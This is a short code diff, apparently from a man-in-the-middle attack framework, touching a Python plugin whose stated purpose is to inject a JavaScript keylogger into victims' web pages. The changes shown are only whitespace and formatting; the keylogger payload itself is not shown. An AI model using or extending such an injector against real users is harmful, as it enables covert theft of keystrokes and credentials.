@@ -2,14 +2,15 @@ from plugins.plugin import Plugin
 from plugins.Inject import Inject
 import logging
 
+
 class jskeylogger(Inject, Plugin):
     name = "Javascript Keylogger"
     optname = "jskeylogger"
     desc = "Injects a javascript keylogger into clients webpages"
-    implements = ["handleResponse","handleHeader","connectionMade", "sendPostData"]
+    implements = ["handleResponse", "handleHeader", "connectionMade", "sendPostData"]
     has_opts = False
 
-    def initialize(self,options):
+    def initialize(self, options):
         Inject.initialize(self, options)
         self.html_payload = self.msf_keylogger()
         print "[*] Javascript Keylogger plugin online"
